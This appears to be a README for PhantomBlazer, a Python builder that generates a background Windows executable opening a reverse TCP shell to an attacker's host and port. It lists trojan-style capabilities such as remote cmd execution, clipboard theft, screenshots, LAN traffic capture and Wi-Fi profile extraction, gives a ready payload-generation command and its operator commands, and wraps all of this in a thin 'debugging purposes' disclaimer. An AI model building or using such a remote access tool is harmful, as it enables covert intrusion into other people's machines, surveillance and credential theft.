 # PhantomBlazer

**PhantomBlazer is a Python-based framework that creates an executable file with various parameters. It allows users to perform a reverse TCP connection and execute cmd commands.**
## Features

- [x] Reverse TCP connection
- [x] Execute cmd commands
- [x] Collect OS info
- [x] Set clipboard text
- [x] Get clipboard text
- [x] Take screenshot
- [x] Start file server
- [x] Analyze LAN traffic
- [x] Type text
- [x] Download URL
- [x] Open link
- [x] Generate WLAN profile

## Usage

PhantomBlazer can be executed with the following parameters:
```
    --lhost/-lh: The local host IP address
    --lport/-lp: The local port number
    --output/-o: The output file name
```
> Example: ``` $python3 phantomblazer.py --lhost 192.168.0.1 --lport 8080 --output payload.exe```

### Inbuilt ommands can be executed using the following syntax:
```
    collect-os-info
    set clipboard <text>
    get clipboard
    take screenshot
    start file server
    analyze lan traffic
    type <text>
    download <url>
    open link <link>
    generate wlan profile *
    generate wlan profile <name>
```
## DISCLAIMER:
This tool is intended for legal and ethical use only. The creator of this tool is not responsible for any illegal or unethical use of this tool.

The tool creates a .exe file which runs as a background and creates a reverse TCP connection, allowing for remote command execution. This tool is intended for debugging purposes and should not be used to gain unauthorized access to systems.

Please use this tool at your own risk and with the appropriate permissions from the system owners. Any actions taken with this tool are the sole responsibility of the user.

By using this tool, you agree to the <a href = "https://github.com/devsdenepal/PhantomBlitz/blob/main/terms-and-conditions.md">```terms and conditions```</a> outlined above and acknowledge that any misuse of this tool is strictly prohibited.
